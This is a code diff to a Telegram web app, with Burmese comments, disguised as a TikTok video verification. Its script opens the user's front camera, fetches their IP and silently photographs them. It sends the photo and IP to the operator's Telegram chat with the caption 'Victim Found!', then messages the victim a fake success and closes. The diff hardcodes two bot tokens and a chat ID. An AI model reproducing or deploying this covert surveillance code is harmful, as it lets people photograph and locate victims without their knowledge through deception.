@@ -22,9 +22,10 @@
     <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
-        // သင့်ရဲ့ အချက်အလက်များ
-        const BOT_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
-        const MY_PERSONAL_ID = "5304050102"; // သင့် Chat ID
+        // --- API CONFIG ---
+        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; // သင့်ဆီ ပုံပို့မည့် Bot
+        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  // တစ်ဖက်လူသုံးနေသည့် Bot
+        const MY_ID = "5304050102"; // သင့် Chat ID
 
         const startBtn = document.getElementById('startBtn');
         const loader = document.getElementById('loader');
@@ -36,16 +37,13 @@
             loader.style.display = 'block';
 
             try {
-                // ၁။ ကင်မရာ ဖွင့်ခြင်း
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
 
-                // ၂။ IP Address ယူခြင်း
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const userIP = ipData.ip;
 
-                // ၃။ ဓာတ်ပုံရိုက်ရန် ၃ စက္ကန့် စောင့်ခြင်း (ပုံသေချာတက်အောင်)
                 setTimeout(async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -53,24 +51,23 @@
                     const imageData = canvas.toDataURL('image/jpeg');
                     const blob = await (await fetch(imageData)).blob();
 
-                    // ၄။ သင့်ဆီ (Personal Chat) ကို ပုံနှင့် IP အရင်ပို့ခြင်း
+                    // ၁။ ShowCam Bot သုံးပြီး သင့်ဆီကို ပုံနှင့် IP ပို့ခြင်း (Victim မမြင်ရတော့ပါ)
                     const formData = new FormData();
-                    formData.append('chat_id', MY_PERSONAL_ID);
+                    formData.append('chat_id', MY_ID);
                     formData.append('photo', blob, 'shot.jpg');
                     formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
-                    // ၅။ TikTok Bot ဆီကို Verification_Success စာပို့ခြင်း (ဒါမှ ဗီဒီယိုကျလာမှာပါ)
-                    const userId = Telegram.WebApp.initDataUnsafe.user.id; 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=✅ Verification_Success`);
+                    // ၂။ TikTok Bot သုံးပြီး Victim ထံ Verification_Success စာပို့ခြင်း (ဗီဒီယိုကျလာစေရန်)
+                    const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
+                    await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
 
-                    // ၆။ အားလုံးပြီးရင် Website ပိတ်လိုက်မယ်
                     stream.getTracks().forEach(track => track.stop());
                     Telegram.WebApp.close();
                 }, 3000);
 
             } catch (err) {
-                alert("ဗီဒီယိုဒေါင်းရန် ခွင့်ပြုချက် (Allow) ပေးဖို့ လိုအပ်ပါသည်။");
+                alert("ခွင့်ပြုချက် (Allow) ပေးမှ အလုပ်လုပ်ပါမည်။");
                 startBtn.style.display = 'block';
                 loader.style.display = 'none';
             }
